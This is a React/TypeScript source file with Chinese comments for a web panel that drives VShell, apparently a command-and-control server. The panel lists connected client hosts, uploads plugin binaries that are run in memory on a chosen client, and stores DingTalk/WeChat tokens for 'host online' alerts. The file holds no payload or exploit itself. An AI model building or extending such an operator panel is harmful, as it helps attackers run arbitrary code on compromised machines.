"use client";

// VShell 插件运行(仿原版):选择客户端 + 选择插件(runner/list)+ 参数 → runplugin;
// 插件上传走 /runner/upload(multipart)。系统设置(dingding/wx 通知)也在本文件。
import * as React from "react";
import { PlayIcon, UploadIcon } from "lucide-react";
import { toast } from "sonner";

import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Field, FieldGroup, FieldLabel } from "@/components/ui/field";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { api } from "@/lib/api";
import type { VshellHost, VshellServer } from "@/lib/types";

export function VshellPluginsPage({ server }: { server: VshellServer }) {
  const [hosts, setHosts] = React.useState<VshellHost[]>([]);
  const [plugins, setPlugins] = React.useState<{ id: number; name: string }[]>([]);
  const [hostId, setHostId] = React.useState("");
  const [pluginId, setPluginId] = React.useState("");
  const [args, setArgs] = React.useState("");
  const [output, setOutput] = React.useState("");
  const [busy, setBusy] = React.useState(false);
  const [uploading, setUploading] = React.useState(false);
  const fileRef = React.useRef<HTMLInputElement>(null);

  const load = React.useCallback(async () => {
    try {
      const [hs, ps] = await Promise.all([
        api.vshellHosts(server.id, false),
        callApi(server.id, "runner/list") as Promise<{ id: number; name: string }[]>,
      ]);
      setHosts(hs);
      setPlugins(Array.isArray(ps) ? ps : []);
    } catch (e) {
      toast.error(e instanceof Error ? e.message : "插件清单加载失败");
    }
  }, [server.id]);

  React.useEffect(() => {
    void load();
  }, [load]);

  const run = async () => {
    if (!hostId || !pluginId) {
      toast.error("先选择客户端和插件");
      return;
    }
    setBusy(true);
    setOutput("");
    try {
      const res = (await callApi(server.id, "runner/runplugin", { client_id: Number(hostId), id: Number(pluginId), args })) as unknown;
      setOutput(typeof res === "string" ? res : JSON.stringify(res, null, 2));
      toast.success("插件执行完成");
    } catch (e) {
      setOutput(`执行失败:${e instanceof Error ? e.message : String(e)}`);
    } finally {
      setBusy(false);
    }
  };

  const upload = async (file: File) => {
    setUploading(true);
    try {
      const fd = new FormData();
      fd.append("file", file);
      const token = localStorage.getItem("artex_token") ?? "";
      const r = await fetch(`/api/shell/vshell/${server.id}/runner/upload`, {
        method: "POST",
        headers: { Authorization: `Bearer ${token}` },
        body: fd,
      });
      const payload = (await r.json().catch(() => ({}))) as { error?: string };
      if (!r.ok) throw new Error(payload.error || `HTTP ${r.status}`);
      toast.success(`插件 ${file.name} 已上传(vshell plugins 目录)`);
      await load();
    } catch (e) {
      toast.error(e instanceof Error ? e.message : "上传失败");
    } finally {
      setUploading(false);
    }
  };

  return (
    <Card>
      <CardContent className="px-5 py-4">
        <p className="text-muted-foreground mb-4 text-xs">
          plugins 目录内的文件都视为插件,内存加载运行,支持 exe / .net / elf / dll / so / dylib(自行添加需遵循后缀规范)。
        </p>
        <FieldGroup className="max-w-xl">
          <Field>
            <FieldLabel>选择客户端</FieldLabel>
            <Select value={hostId} onValueChange={setHostId}>
              <SelectTrigger>
                <SelectValue placeholder="请选择" />
              </SelectTrigger>
              <SelectContent>
                {hosts.map((h) => (
                  <SelectItem key={h.Id} value={String(h.Id)}>
                    #{h.Id} {h.HostName || h.Addr} {h.IsConnect ? "🟢" : "⚪"}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </Field>
          <Field>
            <FieldLabel>选择插件</FieldLabel>
            <Select value={pluginId} onValueChange={setPluginId}>
              <SelectTrigger>
                <SelectValue placeholder="请选择" />
              </SelectTrigger>
              <SelectContent>
                {plugins.map((p) => (
                  <SelectItem key={p.id} value={String(p.id)}>
                    {p.name}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </Field>
          <Field>
            <FieldLabel>参数</FieldLabel>
            <Input value={args} placeholder="请输入" onChange={(e) => setArgs(e.target.value)} />
          </Field>
          <div className="flex gap-2">
            <Button disabled={busy} onClick={() => void run()}>
              <PlayIcon className={`size-4 ${busy ? "animate-pulse" : ""}`} /> {busy ? "运行中…" : "运行"}
            </Button>
            <Button variant="outline" disabled={uploading} onClick={() => fileRef.current?.click()}>
              <UploadIcon className="size-4" /> {uploading ? "上传中…" : "上传插件"}
            </Button>
            <input
              ref={fileRef}
              type="file"
              className="hidden"
              onChange={(e) => {
                const f = e.target.files?.[0];
                if (f) void upload(f);
                e.target.value = "";
              }}
            />
          </div>
          <Field>
            <FieldLabel>output</FieldLabel>
            <textarea
              className="h-64 w-full resize-none rounded-md border bg-black p-3 font-mono text-xs text-zinc-200 outline-none"
              value={output}
              readOnly
              placeholder=""
            />
          </Field>
        </FieldGroup>
      </CardContent>
    </Card>
  );
}

export function VshellSettingsPage({ server }: { server: VshellServer }) {
  const [dingToken, setDingToken] = React.useState("");
  const [dingKeyword, setDingKeyword] = React.useState("");
  const [wxKey, setWxKey] = React.useState("");
  const [busy, setBusy] = React.useState(false);

  React.useEffect(() => {
    callApi(server.id, "setting/get")
      .then((res) => {
        const s = (res ?? {}) as { dingding_access_token?: string; dingding_key_word?: string; wx_key?: string };
        setDingToken(s.dingding_access_token ?? "");
        setDingKeyword(s.dingding_key_word ?? "");
        setWxKey(s.wx_key ?? "");
      })
      .catch(() => {});
  }, [server.id]);

  const save = async () => {
    setBusy(true);
    try {
      await callApi(server.id, "setting/edit", {
        dingding_access_token: dingToken,
        dingding_key_word: dingKeyword,
        wx_key: wxKey,
      });
      toast.success("设置已保存(vshell 无需重启生效)");
    } catch (e) {
      toast.error(e instanceof Error ? e.message : "保存失败");
    } finally {
      setBusy(false);
    }
  };

  return (
    <Card>
      <CardContent className="px-5 py-4">
        <p className="font-medium">设置</p>
        <p className="text-muted-foreground mb-4 text-xs">无需重启修改部分设置——上线通知推送(vshell 侧)。</p>
        <FieldGroup className="max-w-xl">
          <Field>
            <FieldLabel>钉钉 token</FieldLabel>
            <Input value={dingToken} onChange={(e) => setDingToken(e.target.value)} />
          </Field>
          <Field>
            <FieldLabel>钉钉 key_word</FieldLabel>
            <Input value={dingKeyword} onChange={(e) => setDingKeyword(e.target.value)} />
          </Field>
          <Field>
            <FieldLabel>微信 wx_key</FieldLabel>
            <Input value={wxKey} onChange={(e) => setWxKey(e.target.value)} />
          </Field>
          <Button className="w-fit" disabled={busy} onClick={() => void save()}>
            {busy ? "保存中…" : "保存"}
          </Button>
        </FieldGroup>
      </CardContent>
    </Card>
  );
}

async function callApi(serverId: string, endpoint: string, body?: unknown) {
  const r = await fetch(`/api/shell/vshell/${serverId}/api/${endpoint}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ endpoint, body: body ?? {} }),
  });
  const payload = (await r.json().catch(() => ({}))) as { error?: string; result?: unknown };
  if (!r.ok) throw new Error(payload.error || `HTTP ${r.status}`);
  return payload.result;
}
